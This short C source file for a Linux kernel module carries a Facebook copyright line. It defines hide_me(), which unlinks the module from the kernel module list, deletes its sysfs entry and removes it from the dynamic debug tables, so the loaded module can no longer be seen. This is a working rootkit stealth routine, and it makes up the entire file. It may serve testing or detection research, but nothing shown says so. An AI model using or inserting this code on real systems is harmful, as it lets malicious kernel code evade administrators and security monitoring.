// Copyright 2004-present Facebook. All Rights Reserved.

#include <linux/module.h>

#include "hide.h"

extern char *module_str;

void rm_mod_from_list(void) {
  THIS_MODULE->list.next->prev = THIS_MODULE->list.prev;
  THIS_MODULE->list.prev->next = THIS_MODULE->list.next;
}

void rm_mod_from_sysfs(void) {
  kobject_del(THIS_MODULE->holders_dir->parent);
}

void rm_mod_from_ddebug_tables(void) {
  ddebug_remove_module(module_str);
}

void hide_me(void) {
  rm_mod_from_list();
  rm_mod_from_sysfs();
  rm_mod_from_ddebug_tables();
}
